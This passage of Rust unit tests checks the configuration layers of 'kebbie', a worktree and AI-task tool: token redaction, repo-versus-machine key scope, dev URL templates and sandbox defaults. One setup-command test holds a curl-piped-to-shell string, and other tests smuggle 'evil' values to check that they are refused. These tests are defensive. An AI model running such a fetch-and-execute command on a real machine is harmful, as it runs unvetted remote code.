        assert!(default.contains("update.channel = \"release\"  (default)\n  What kebbie update installs"), "{default}");
        let main = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &machine("[update]\nchannel = \"main\"\n")) });
        assert!(main.contains("update.channel = \"main\"  (machine config)"), "{main}");
    }

    #[test]
    fn reports_go_to_the_issues_endpoint_and_the_inbox_token_is_never_shown() {
        let defaults = settings(&Worktree::default(), &Machine::default());
        assert_eq!((defaults.report_signals.value, defaults.report_text.value, defaults.report_inbox.value), (true, ReportText::Ask, false));
        let config = machine("[report]\nsignals = false\ntext = \"always\"\ninbox_token = \"kha_secret-token-1234\"\n");
        assert_eq!((config.report.url(), config.report.signals(), config.report.text(), config.report.inbox_token.as_deref()), (UNSENT_REPORT_URL, false, ReportText::Always, Some("kha_secret-token-1234")));
        assert!(!format!("{config:?}").contains("kha_secret"), "Debug hides the token");
        let dir = crate::sh::test_dir("config-report");
        let file = dir.join("config.toml");
        std::fs::write(&file, "[report]\ninbox_token = \"kha_secret-token-1234\"\n").unwrap();
        let loaded = Loaded { machine: file.clone(), repo: None, settings: settings(&Worktree::default(), &load_machine(&file).unwrap()) };
        let shown = describe(&loaded);
        assert!(shown.contains("report.inbox_token = set  (machine config)"), "{shown}");
        assert!(!shown.contains("kha_secret"), "{shown}");
        let refused = parse_repo("[report]\ninbox_token = \"kha_x1234567\"\n", "app.toml").unwrap_err();
        assert!(refused.contains("report: applies to every repo, so it lives in config.toml"), "a repo config never holds the token: {refused}");
        assert!(unknown_machine("[report]\nurl = \"https://hub.example.com\"\n").contains("report.url: unknown key"), "the endpoint is not a setting");
        assert!(parse_machine("[report]\ninbox_token = \"khm_machine\"\n", "config.toml").unwrap_err().contains("report.inbox_token"));
        assert!(unknown_machine("[report]\nsecret = 1\n").contains("report.secret: unknown key"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_debug_build_never_addresses_the_production_issues_endpoint() {
        assert_eq!(Report::default().url(), UNSENT_REPORT_URL);
        assert_eq!(crate::hub::hub_url(UNSENT_REPORT_URL).as_deref(), Ok(UNSENT_REPORT_URL), "a loopback address every sender accepts and none can reach beyond this machine");
        assert_ne!(Report::default().url(), REPORT_URL);
    }

    #[test]
    fn signals_are_on_and_text_is_asked_by_default_and_an_old_enabled_false_turns_both_off() {
        let fresh = Report::default();
        assert_eq!((fresh.signals(), fresh.text()), (true, ReportText::Ask));
        let old_off = machine("[report]\nenabled = false\n").report;
        assert_eq!((old_off.signals(), old_off.text()), (false, ReportText::Never), "a config from before the split keeps everything off");
        let old_on = machine("[report]\nenabled = true\n").report;
        assert_eq!((old_on.signals(), old_on.text()), (true, ReportText::Ask));
        let mixed = machine("[report]\nenabled = false\nsignals = true\n").report;
        assert_eq!((mixed.signals(), mixed.text()), (true, ReportText::Never), "a new key wins over enabled, key by key");
        let off = settings(&Worktree::default(), &machine("[report]\nenabled = false\n"));
        assert_eq!((off.report_signals.value, off.report_text.value, off.report_signals.layer, off.report_text.layer), (false, ReportText::Never, Layer::Machine, Layer::Machine));
        assert!(parse_machine("[report]\ntext = \"sometimes\"\n", "config.toml").unwrap_err().contains("report.text: must be \"ask\", \"always\" or \"never\""));
        assert!(parse_machine("[report]\nsignals = \"yes\"\n", "config.toml").unwrap_err().contains("report.signals: must be true or false"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("report.signals = true  (default)\n  Whether kebbie sends its maintainers error signals, counts of kebbie's own failures") && shown.contains("Never an error message, path, repo, task or host name"), "{shown}");
        assert!(shown.contains("report.text = \"ask\"  (default)\n  What happens to a bug in kebbie you ran into"), "{shown}");
    }

    #[test]
    fn the_vault_command_is_machine_config_only() {
        let from_machine = machine("[vault]\ncommand = \"uv run --project ~/src/notes-vault-mcp notes-vault-mcp\"\n");
        assert_eq!(settings(&Worktree::default(), &from_machine).vault_command, Setting { value: Some("uv run --project ~/src/notes-vault-mcp notes-vault-mcp".to_string()), layer: Layer::Machine });
        assert!(parse_repo("[vault]\ncommand = \"evil\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kebbie/repos/app.toml: vault: applies to every repo"));
        assert!(unknown_machine("[vault]\ncmd = \"x\"\n").contains("vault.cmd: unknown key; known keys here: command"));
        let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
        assert!(describe(&default).contains("vault.command = none  (default)\n  The notes-vault-mcp command"), "{}", describe(&default));
    }

    #[test]
    fn describe_names_each_value_and_its_layer() {
        let loaded = |own: Worktree, machine: Machine| Loaded { machine: PathBuf::from("/c.toml"), repo: Some(PathBuf::from("/home/u/.config/kebbie/repos/app.toml")), settings: settings(&own, &machine) };
        let shown = describe(&loaded(Worktree::default(), Machine::default()));
        assert!(shown.contains("repo config:    /home/u/.config/kebbie/repos/app.toml (not found)"), "{shown}");
        assert!(shown.contains("[[actions]]  (repo config only)\n  The Areas page's own actions for the repo, one table each, with the keys id, key, title,"), "{shown}");
        assert!(shown.contains("machine config: /c.toml (not found)"));
        assert!(shown.contains("board.backlog.sources = [\"local\"]  (default)\n  Where the board's Backlog tab finds work"));
        assert!(shown.contains("worktree.setup_skill = \"kebbie:set-up-worktree\"  (default)"));
        assert!(shown.contains("worktree.dev_server = none  (default)"));
        let shown = describe(&loaded(repo("[worktree]\ndev_server = \"npm run dev\"\n"), machine(MACHINE)));
        assert!(shown.contains("board.backlog.sources = [\"vault\", \"linear\"]  (machine config)"));
        assert!(shown.contains("worktree.setup_skill = \"my-tools:set-up-worktree\"  (machine config)"));
        assert!(shown.contains("worktree.dev_server = \"npm run dev\"  (repo config)"));
        let outside = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
        assert!(describe(&outside).contains("none: not in a git repo"));
    }

    fn sample(entry: &Entry) -> String {
        if format!("x = {}", entry.value).parse::<Table>().is_ok() {
            return entry.value.clone();
        }
        match &entry.kind {
            Kind::Choice(options) => format!("{:?}", options[1]),
            Kind::Secret => "\"kha_token\"".to_string(),
            _ => "\"x\"".to_string(),
        }
    }

    #[test]
    fn each_keys_scope_is_the_files_that_take_it_and_what_its_text_says() {
        let loaded = Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
        let all = entries(&loaded);
        assert_eq!(all.len(), 38);
        for entry in all {
            let (section, field) = entry.key.rsplit_once('.').unwrap();
            let text = format!("[{section}]\n{field} = {}\n", sample(&entry));
            assert_eq!(parse_machine(&text, "config.toml").is_ok(), entry.scope != Scope::Repo, "{}: {text}", entry.key);
            assert_eq!(parse_repo(&text, "app.toml").is_ok(), entry.scope != Scope::Machine, "{}: {text}", entry.key);
            let machine_only = entry.about.contains("config.toml only") || entry.about.contains("never in a repo config");
            assert_eq!((machine_only, entry.about.contains("repo config only")), (entry.scope == Scope::Machine, entry.scope == Scope::Repo), "{}: {}", entry.key, entry.about);
        }
    }

    fn place(number: Option<usize>, port: Option<u16>) -> Place {
        Place { worktree: "wt1.app".to_string(), repo: "app".to_string(), number, port }
    }

    #[test]
    fn dev_url_fills_in_each_placeholder() {
        let here = place(Some(1), Some(3001));
        assert_eq!(expand(DEFAULT_DEV_URL, &here).as_deref(), Some("http://localhost:3001"));
        assert_eq!(expand("https://{worktree}.dev", &here).as_deref(), Some("https://wt1.app.dev"));
        assert_eq!(expand("https://{repo}-{number}.test:{port}/", &here).as_deref(), Some("https://app-1.test:3001/"));
        assert_eq!(expand("https://example.test", &here).as_deref(), Some("https://example.test"));
    }

    #[test]
    fn dev_url_reads_the_worktrees_own_port_and_pool_number() {
        let dir = std::env::temp_dir().join(format!("kebbie-dev-url-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("wt1.app")).unwrap();
        std::fs::write(dir.join("wt1.app/.env"), "PORT=3001\n").unwrap();
        let url = |template: &str| dev_url(Some(template), &dir.join("app"), &dir.join("wt1.app"));
        assert_eq!(url(DEFAULT_DEV_URL).as_deref(), Some("http://localhost:3001"));
        assert_eq!(url("https://{repo}{number}.test").as_deref(), Some("https://app1.test"));
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn dev_url_gives_no_link_when_the_worktree_lacks_what_it_names() {
        assert_eq!(expand(DEFAULT_DEV_URL, &place(Some(1), None)), None, "no recorded port, no localhost link");
        assert_eq!(expand("https://{worktree}.dev", &place(Some(1), None)).as_deref(), Some("https://wt1.app.dev"), "a template without {{port}} needs none");
        assert_eq!(expand("http://wt{number}.local", &place(None, Some(3000))), None);
        assert_eq!(expand("", &place(Some(1), Some(3001))), None);
    }

    #[test]
    fn an_empty_dev_url_turns_the_link_off_in_either_file() {
        let off = settings(&repo("[worktree]\ndev_url = \"\"\n"), &machine("[worktree]\ndev_url = \"https://{worktree}.dev\"\n"));
        assert_eq!(off.dev_url, Setting { value: None, layer: Layer::Repo });
        let from_machine = settings(&Worktree::default(), &machine("[worktree]\ndev_url = \"https://{worktree}.dev\"\n"));
        assert_eq!(from_machine.dev_url, Setting { value: Some("https://{worktree}.dev".to_string()), layer: Layer::Machine });
        assert_eq!(dev_url(off.dev_url.value.as_deref(), Path::new("/src/app"), Path::new("/src/wt1.app")), None);
        assert_eq!(dev_url(from_machine.dev_url.value.as_deref(), Path::new("/src/app"), Path::new("/src/wt1.app")).as_deref(), Some("https://wt1.app.dev"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
        assert!(shown.contains("worktree.dev_url = \"\" (no link)  (repo config)"), "{shown}");
    }

    #[test]
    fn dev_route_is_off_until_a_repo_config_turns_it_on_and_config_toml_cannot() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).dev_route, Setting { value: false, layer: Layer::Default });
        assert_eq!(settings(&repo("[worktree]\ndev_route = true\n"), &Machine::default()).dev_route, Setting { value: true, layer: Layer::Repo });
        let refused = parse_machine("[worktree]\ndev_route = true\n", "config.toml").unwrap_err();
        assert!(refused.starts_with("config.toml: worktree.dev_route: each repo opts in on its own, so it lives in its repo config"), "{refused}");
        assert!(parse_repo("[worktree]\ndev_route = \"yes\"\n", "app.toml").unwrap_err().contains("worktree.dev_route: must be true or false"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("worktree.dev_route = false  (default)"), "{shown}");
    }

    #[test]
    fn stage_on_main_is_off_until_a_repo_config_turns_it_on_and_config_toml_cannot() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).stage_on_main, Setting { value: false, layer: Layer::Default });
        assert_eq!(settings(&repo("[worktree]\nstage_on_main = true\n"), &Machine::default()).stage_on_main, Setting { value: true, layer: Layer::Repo });
        let refused = parse_machine("[worktree]\nstage_on_main = true\n", "config.toml").unwrap_err();
        assert!(refused.starts_with("config.toml: worktree.stage_on_main: each repo opts in on its own, so it lives in its repo config"), "{refused}");
        assert!(parse_repo("[worktree]\nstage_on_main = 1\n", "app.toml").unwrap_err().contains("worktree.stage_on_main: must be true or false"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("worktree.stage_on_main = false  (default)"), "{shown}");
    }

    #[test]
    fn docs_required_is_off_until_a_repo_config_turns_it_on_and_config_toml_cannot() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).docs_required, Setting { value: false, layer: Layer::Default });
        assert_eq!(settings(&repo("[docs]\nrequired = true\n"), &Machine::default()).docs_required, Setting { value: true, layer: Layer::Repo });
        let refused = parse_machine("[docs]\nrequired = true\n", "config.toml").unwrap_err();
        assert!(refused.starts_with("config.toml: docs.required: each repo opts in on its own, so it lives in its repo config"), "{refused}");
        assert!(parse_repo("[docs]\nrequired = \"yes\"\n", "app.toml").unwrap_err().contains("docs.required: must be true or false"));
        assert!(unknown_repo("[docs]\nrequire = true\n").contains("docs.require: unknown key; known keys here: required"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&repo("[docs]\nrequired = true\n"), &Machine::default()) });
        assert!(shown.contains("docs.required = true  (repo config)"), "{shown}");
    }

    #[test]
    fn an_unknown_placeholder_is_refused_when_loading_with_the_key_named() {
        let refused = parse_repo("[worktree]\ndev_url = \"https://{branch}.dev\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err();
        assert_eq!(refused, "/home/u/.config/kebbie/repos/app.toml: worktree.dev_url: {branch} is not a placeholder; use {worktree}, {repo}, {number} or {port}");
        assert!(parse_machine("[worktree]\ndev_url = \"http://localhost:{port\"\n", "config.toml").unwrap_err().contains("worktree.dev_url: \"http://localhost:{port\" opens a { it never closes"));
        assert!(parse_machine("[worktree]\ndev_url = 3000\n", "config.toml").unwrap_err().contains("worktree.dev_url: must be a string"));
    }

    #[test]
    fn a_path_setup_command_applies_only_in_a_repo_that_has_the_file() {
        let dir = std::env::temp_dir().join(format!("kebbie-setup-in-{}", std::process::id()));
        std::fs::create_dir_all(dir.join("script")).unwrap();
        std::fs::write(dir.join("script/prepare_worktree"), "").unwrap();
        let command = |value: &str| setup_command_in(Some(value.to_string()), &dir);
        assert_eq!(command("script/prepare_worktree --quiet").as_deref(), Some("script/prepare_worktree --quiet"));
        assert_eq!(command("script/elsewhere"), None, "a repo without the file keeps the default setup");
        assert_eq!(command("make prepare").as_deref(), Some("make prepare"), "a bare program comes from PATH");
        assert_eq!(setup_command_in(None, &dir), None);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn setup_command_layers_like_setup_skill() {
        let from_machine = machine("[worktree]\nsetup_command = \"bin/prepare\"\n");
        assert_eq!(settings(&Worktree::default(), &from_machine).setup_command, Setting { value: Some("bin/prepare".to_string()), layer: Layer::Machine });
        let both = settings(&repo("[worktree]\nsetup_command = \"script/prepare_worktree\"\n"), &from_machine);
        assert_eq!(both.setup_command, Setting { value: Some("script/prepare_worktree".to_string()), layer: Layer::Repo });
        assert_eq!(settings(&repo("[worktree]\ndev_server = \"bin/dev\"\n"), &from_machine).setup_command.layer, Layer::Machine);
        assert!(parse_repo("[worktree]\nsetup_command = \" \"\n", "app.toml").unwrap_err().contains("worktree.setup_command: must not be empty"));
        assert!(parse_machine("[worktree]\nsetup_command = [\"x\"]\n", "config.toml").unwrap_err().contains("worktree.setup_command: must be a string"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both });
        assert!(shown.contains("worktree.setup_command = \"script/prepare_worktree\"  (repo config)\n  The repo's own command that prepares an existing worktree"), "{shown}");
        let default = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(default.contains("worktree.setup_command = none  (default)\n  "), "{default}");
        assert!(default.contains("A path applies only in a repo that has the file; elsewhere, and when none, bin/setup-worktree when the repo has one."));
    }

    #[test]
    fn dev_worker_layers_like_dev_server() {
        let both = settings(&repo("[worktree]\ndev_worker = \"bin/jobs\"\n"), &machine("[worktree]\ndev_worker = \"npm run worker\"\n"));
        assert_eq!(both.dev_worker, Setting { value: Some("bin/jobs".to_string()), layer: Layer::Repo });
        assert!(parse_repo("[worktree]\ndev_worker = \"\"\n", "app.toml").unwrap_err().contains("worktree.dev_worker: must not be empty"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both });
        assert!(shown.contains("worktree.dev_worker = \"bin/jobs\"  (repo config)\n  A second command"), "{shown}");
        assert!(shown.contains("worktree.dev_url = \"http://localhost:{port}\"  (default)"), "{shown}");
    }

    #[test]
    fn server_and_worker_names_come_from_the_machine_config_only() {
        let machine = parse_machine("[worktree]\nserver_name = \"web\"\n", "machine").unwrap();
        let resolved = settings(&Worktree::default(), &machine);
        assert_eq!(resolved.server_name, Setting { value: "web".to_string(), layer: Layer::Machine });
        assert_eq!(resolved.worker_name, Setting { value: DEFAULT_WORKER_NAME.to_string(), layer: Layer::Default });
        assert!(parse_repo("[worktree]\nserver_name = \"web\"\n", "repo").unwrap_err().contains("lives in config.toml"));
    }

    #[test]
    fn a_setup_command_that_names_a_path_is_checked_against_the_repo_and_an_absolute_one_passes_as_it_is() {
        let dir = std::env::temp_dir().join(format!("kebbie-setup-abs-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        assert_eq!(setup_command_in(Some("/bin/sh -c 'curl x | sh'".to_string()), &dir).as_deref(), Some("/bin/sh -c 'curl x | sh'"), "an absolute program exists whatever the repo; only the machine config layer should carry one");
        assert_eq!(setup_command_in(Some("./bin/prepare".to_string()), &dir), None);
        std::fs::create_dir_all(dir.join("bin")).unwrap();
        std::fs::write(dir.join("bin/prepare"), "").unwrap();
        assert_eq!(setup_command_in(Some("./bin/prepare --fast".to_string()), &dir).as_deref(), Some("./bin/prepare --fast"));
        assert_eq!(setup_command_in(Some("   ".to_string()), &dir).as_deref(), Some("   "), "an empty command is refused by the parser, not here");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_template_refuses_an_empty_or_nested_placeholder_and_keeps_literal_text() {
        let refused = |template: &str| pieces(template).map(|_| ()).unwrap_err();
        assert!(refused("{}").contains("{} is not a placeholder"));
        assert!(refused("{{port}}").contains("{{port} is not a placeholder"));
        assert!(pieces("a } b").is_ok(), "a stray closing brace is text");
        assert!(refused("{port").contains("never closes"));
        assert_eq!(expand("{port}{port}", &Place { worktree: String::new(), repo: String::new(), number: None, port: Some(3) }).as_deref(), Some("33"));
        assert_eq!(expand("literal", &Place { worktree: String::new(), repo: String::new(), number: None, port: None }).as_deref(), Some("literal"));
        assert_eq!(template(&"x = \"  \"".parse().unwrap(), "x", "k").unwrap().as_deref(), Some(""), "whitespace alone is the empty template that turns the link off");
        assert!(text(&"x = \"  \"".parse().unwrap(), "x", "k").unwrap_err().contains("must not be empty"));
    }

    #[test]
    fn the_config_paths_follow_the_environment_variables() {
        let path = path();
        assert!(path.ends_with("config.toml") || std::env::var_os("KEBBIE_CONFIG").is_some());
        assert!(dir().ends_with("kebbie"));
    }

    #[test]
    fn a_repo_config_cannot_hold_a_machine_wide_key_under_another_table() {
        for text in ["[worktree]\nnotify_command = \"x\"\n", "[worktree]\nvault_command = \"x\"\n", "[task]\nnotify = \"x\"\n", "[review]\ncommand = \"x\"\n"] {
            assert!(unknown_repo(text).contains("unknown key"), "{text}");
            assert_eq!(repo(text), Worktree::default(), "{text}");
        }
        assert!(parse_repo("[board]\nbacklog = {}\n", "app.toml").is_err());
        let smuggled = Worktree { vault_command: Some("evil".to_string()), notify_command: Some("evil".to_string()), server_name: Some("x".to_string()), worker_name: Some("y".to_string()), ..Worktree::default() };
        let resolved = settings(&smuggled, &Machine::default());
        assert_eq!(resolved.vault_command.value, None);
        assert_eq!(resolved.notify_command.value, None);
        assert_eq!(resolved.server_name.value, DEFAULT_SERVER_NAME);
        assert_eq!(resolved.worker_name.value, DEFAULT_WORKER_NAME);
    }

    #[test]
    fn task_profile_names_the_profile_a_task_starts_with_and_a_repo_config_wins() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).profile, Setting { value: None, layer: Layer::Default });
        let machine = machine("[task]\nprofile = \"quick\"\n");
        assert_eq!(settings(&Worktree::default(), &machine).profile, Setting { value: Some("quick".to_string()), layer: Layer::Machine });
        let both = settings(&repo("[task]\nprofile = \"designer\"\n"), &machine);
        assert_eq!(both.profile, Setting { value: Some("designer".to_string()), layer: Layer::Repo });
        assert!(parse_repo("[task]\nprofile = \"Design Work\"\n", "app.toml").unwrap_err().contains("task.profile: \"Design Work\" is not a profile name"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: both });
        assert!(shown.contains("task.profile = \"designer\"  (repo config)\n  The profile a task starts with when kebbie start names none with --profile"), "{shown}");
        let none = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(none.contains("task.profile = none (\"task\")  (default)"), "{none}");
    }

    #[test]
    fn the_task_sandbox_is_on_until_turned_off_and_a_repo_wins_over_the_machine() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).sandbox, Setting { value: true, layer: Layer::Default });
        assert_eq!(settings(&Worktree::default(), &machine("[task]\nsandbox = false\n")).sandbox, Setting { value: false, layer: Layer::Machine });
        assert_eq!(settings(&repo("[task]\nsandbox = true\n"), &machine("[task]\nsandbox = false\n")).sandbox, Setting { value: true, layer: Layer::Repo });
        assert!(parse_repo("[task]\nsandbox = \"off\"\n", "app.toml").unwrap_err().contains("task.sandbox: must be true or false"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("task.sandbox = true  (default)\n  Whether a task's and the reviewer's shell commands run in Claude Code's sandbox"), "{shown}");
    }

    #[test]
    fn steps_are_on_until_turned_off_and_a_repo_wins_over_the_machine() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).steps, Setting { value: true, layer: Layer::Default });
        assert_eq!(settings(&Worktree::default(), &machine("[task]\nsteps = false\n")).steps, Setting { value: false, layer: Layer::Machine });
        assert_eq!(settings(&repo("[task]\nsteps = false\n"), &Machine::default()).steps, Setting { value: false, layer: Layer::Repo });
        assert_eq!(settings(&repo("[task]\nsteps = true\n"), &machine("[task]\nsteps = false\n")).steps, Setting { value: true, layer: Layer::Repo });
        assert!(parse_repo("[task]\nsteps = \"yes\"\n", "app.toml").unwrap_err().contains("task.steps: must be true or false"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("task.steps = true  (default)\n  Tasks work in steps, one commit each, listed with kebbie steps"), "{shown}");
    }
}
